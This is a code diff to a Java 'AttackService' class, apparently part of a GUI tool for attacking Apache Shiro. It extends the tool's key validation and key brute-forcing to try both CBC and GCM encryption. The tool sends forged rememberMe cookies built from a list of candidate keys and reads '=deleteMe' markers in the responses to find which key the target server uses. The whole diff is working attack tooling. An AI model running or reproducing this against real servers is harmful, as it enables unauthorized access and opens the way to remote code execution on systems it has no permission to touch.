@@ -515,17 +515,24 @@ public class AttackService {
             if (shiroKey == null || shiroKey.trim().isEmpty()) {
                 return false;
             }
-            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, this.shiroKeyWord, shiroKey);
-            HashMap<String, String> header = new HashMap();
-            header.put("Cookie", rememberMe);
-            String result = this.headerHttpRequest(header);
-            if (result == null || result.isEmpty()) {
-                return false;
+            for (int cipherType = 0; cipherType <= 1; cipherType++) {
+                String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, this.shiroKeyWord, shiroKey, cipherType);
+                HashMap<String, String> header = new HashMap();
+                header.put("Cookie", rememberMe);
+                String result = this.headerHttpRequest(header);
+                if (result != null && !result.isEmpty()) {
+                    boolean matched;
+                    if (this.flagCount <= 1) {
+                        matched = !result.contains("=deleteMe");
+                    } else {
+                        matched = countDeleteMe(result) < this.flagCount;
+                    }
+                    if (matched) {
+                        return true;
+                    }
+                }
             }
-            if (this.flagCount <= 1) {
-                return !result.contains("=deleteMe");
-            }
-            return countDeleteMe(result) < this.flagCount;
+            return false;
         } catch (Exception ignored) {
             return false;
         }
@@ -628,31 +635,34 @@ public class AttackService {
                 try {
                     for(int i = 0; i < shiroKeys.size(); ++i) {
                         String shirokey = (String)shiroKeys.get(i);
+                        boolean found = false;
 
-                        try {
-                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
-                            HashMap<String, String> header = new HashMap();
-                            header.put("Cookie", rememberMe);
-                            String result = AttackService.this.headerHttpRequest(header);
-                            Thread.sleep(100L);
-                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
-                                final String foundKey = shirokey;
-                                Platform.runLater(() -> {
-                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
-                                    AttackService.this.mainController.shiroKey.setText(foundKey);
-                                });
-                                AttackService.realShiroKey = shirokey;
-                                break;
+                        for (int cipherType = 0; cipherType <= 1 && !found; cipherType++) {
+                            try {
+                                String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i), cipherType);
+                                HashMap<String, String> header = new HashMap();
+                                header.put("Cookie", rememberMe);
+                                String result = AttackService.this.headerHttpRequest(header);
+                                Thread.sleep(100L);
+                                if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
+                                    final String foundKey = shirokey;
+                                    final int matchType = cipherType;
+                                    Platform.runLater(() -> {
+                                        AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey + (matchType == 1 ? " (GCM)" : " (CBC)")));
+                                        AttackService.this.mainController.shiroKey.setText(foundKey);
+                                    });
+                                    AttackService.realShiroKey = shirokey;
+                                    found = true;
+                                }
+                            } catch (Exception var6) {
                             }
-
-                            final String failKey1 = shirokey;
-                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
-                        } catch (Exception var6) {
-                            final String failKey2 = shirokey;
-                            final String errMsg1 = var6.getMessage();
-                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg1)));
                         }
 
+                        if (found) {
+                            break;
+                        }
+                        final String failKey1 = shirokey;
+                        Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                     }
                     Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));
 
@@ -670,31 +680,34 @@ public class AttackService {
                 try {
                     for(int i = 0; i < shiroKeys.size(); ++i) {
                         String shirokey = (String)shiroKeys.get(i);
+                        boolean found = false;
 
-                        try {
-                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
-                            HashMap<String, String> header = new HashMap();
-                            header.put("Cookie", rememberMe);
-                            String result = AttackService.this.headerHttpRequest(header);
-                            Thread.sleep(100L);
-                            if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
-                                final String foundKey = shirokey;
-                                Platform.runLater(() -> {
-                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
-                                    AttackService.this.mainController.shiroKey.setText(foundKey);
-                                });
-                                AttackService.realShiroKey = shirokey;
-                                break;
+                        for (int cipherType = 0; cipherType <= 1 && !found; cipherType++) {
+                            try {
+                                String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i), cipherType);
+                                HashMap<String, String> header = new HashMap();
+                                header.put("Cookie", rememberMe);
+                                String result = AttackService.this.headerHttpRequest(header);
+                                Thread.sleep(100L);
+                                if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
+                                    final String foundKey = shirokey;
+                                    final int matchType = cipherType;
+                                    Platform.runLater(() -> {
+                                        AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey + (matchType == 1 ? " (GCM)" : " (CBC)")));
+                                        AttackService.this.mainController.shiroKey.setText(foundKey);
+                                    });
+                                    AttackService.realShiroKey = shirokey;
+                                    found = true;
+                                }
+                            } catch (Exception var6) {
                             }
-
-                            final String failKey1 = shirokey;
-                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
-                        } catch (Exception var6) {
-                            final String failKey2 = shirokey;
-                            final String errMsg2 = var6.getMessage();
-                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg2)));
                         }
 
+                        if (found) {
+                            break;
+                        }
+                        final String failKey1 = shirokey;
+                        Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                     }
                     Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));
 
